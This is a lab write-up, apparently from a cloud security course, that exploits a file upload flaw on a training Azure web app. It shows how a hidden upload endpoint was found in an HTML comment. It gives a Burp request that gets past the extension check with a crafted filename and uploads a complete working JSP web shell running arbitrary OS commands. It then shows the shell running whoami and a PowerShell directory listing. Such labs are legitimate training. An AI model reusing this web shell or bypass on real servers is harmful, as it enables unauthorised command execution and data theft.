# Attack Lab 9

```
- Find and exploit the File Upload vulnerability and execute OS Level command on the contact application (https://contactpharmacorp.azurewebsites.net/)
− Extract the information from the Application settings
```

## Access to the web resource

Access to the web content and look for source code:

```
view-source:https://contactpharmacorp.azurewebsites.net/
```
At the end of the web application et's possible find a comment of an existing function

```
	<!-- =======================================================
  * Method Name: openUploadForm - v2.3.0
  * Action value: /upload
  * Author: John Doe
  * Change request number: AWS/FREE/01CR02
  ======================================================== 

	<script>

function openUploadForm(){
	

	var form = document.getElementById("UploadForm");
	form.action = '/upload';
	form.submit();
	
	
}
```
The resource discover new web page:

```
https://contactpharmacorp.azurewebsites.net/upload
```

Use burpsuit for insecure file upload:
In order to bypass the file extension validation it's necesary modify the file extension name, beafore upload the webshell:
```
POST /upload?action=upload&callType=ajax HTTP/1.1
Host: contactpharmacorp.azurewebsites.net
Cookie: JSESSIONID=B8D4F807B8532A25388E75C1A30A4518; ARRAffinity=997260270c326e2938e72fa9af69674fa8b4402f8e9e65121c461d08eb0abce6; ARRAffinitySameSite=997260270c326e2938e72fa9af69674fa8b4402f8e9e65121c461d08eb0abce6
Content-Length: 970
Sec-Ch-Ua: "Chromium";v="103", ".Not/A)Brand";v="99"
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.53 Safari/537.36
Sec-Ch-Ua-Platform: "Windows"
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary2lULhXypKALMqtYa
Accept: */*
Origin: https://contactpharmacorp.azurewebsites.net
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://contactpharmacorp.azurewebsites.net/upload
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close

------WebKitFormBoundary2lULhXypKALMqtYa
Content-Disposition: form-data; name="file"; filename="student107.js\p"
Content-Type: application/octet-stream

<%@ page
import="java.util.*,java.io.*"%>
<%
%>
<HTML>
<BODY>
<H3>JSP SHELL</H3>
<FORM METHOD="GET" NAME="myform"
ACTION="">
<INPUT TYPE="text" NAME="cmd">
<INPUT TYPE="submit" VALUE="Execute">
</FORM>
<PRE>
<%
if (request.getParameter("cmd") != null) {
out.println("Command: " +
request.getParameter("cmd") + "<BR>");
Process p =
Runtime.getRuntime().exec(request.getParameter("cmd"));
OutputStream os = p.getOutputStream();
InputStream in = p.getInputStream();
DataInputStream dis = new DataInputStream(in);
String disr = dis.readLine();
while ( disr != null ) {
out.println(disr);
disr = dis.readLine();
}
}
%>
</PRE>
</BODY>
</HTML>
------WebKitFormBoundary2lULhXypKALMqtYa
Content-Disposition: form-data; name="studentx.js\p"


------WebKitFormBoundary2lULhXypKALMqtYa--
```
Response:
```
HTTP/1.1 200 OK
Content-Length: 8
Connection: close
Date: Sun, 08 Oct 2023 09:10:39 GMT
X-Powered-By: ASP.NET

uploaded
```
Using webshell:

```
view-source:https://contactpharmacorp.azurewebsites.net/studentx.jsp?cmd=whoami


<HTML>
<BODY>
<H3>JSP SHELL</H3>
<FORM METHOD="GET" NAME="myform"
ACTION="">
<INPUT TYPE="text" NAME="cmd">
<INPUT TYPE="submit" VALUE="Execute">
</FORM>
<PRE>
Command: whoami<BR>
iis apppool\contactpharmacorp

</PRE>
</BODY>
</HTML>

```
view-source:https://contactpharmacorp.azurewebsites.net/studentx.jsp?cmd=powershell%20-c%20"ls%20webapps/ROOT/WEB-INF/"
```
Command: powershell -c "ls webapps/ROOT/WEB-INF"<BR>


    Directory: C:\home\site\wwwroot\webapps\ROOT\WEB-INF


Mode                LastWriteTime         Length Name                          
----                -------------         ------ ----                          
d-----        10/3/2023  12:08 PM                classes                       
d-----        10/3/2023  12:08 PM                lib                           
-a----         6/3/2022  11:54 AM            362 appengine-web.xml             
-a----         6/3/2022  11:54 AM            139 logging.properties            
------        10/3/2023  12:08 PM            751 web.xml  
```
